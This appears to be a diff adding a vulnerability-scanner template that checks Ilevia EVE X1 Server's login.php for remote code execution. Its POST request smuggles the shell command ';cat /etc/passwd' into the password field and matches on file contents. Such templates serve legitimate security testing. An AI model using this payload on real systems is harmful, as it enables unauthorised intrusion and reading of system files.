@@ -1,0 +1,28 @@
+id: poc-yaml-ilevia-eve-x1-server-login-php-rce
+info:
+  name: Ilevia EVE X1 Server login.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/ajax/php/login.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      userid=admin&passwd=;cat%20/etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+          - "Wrong password"
+      - type: word
+        words:
+          - "<"
+        negative: true
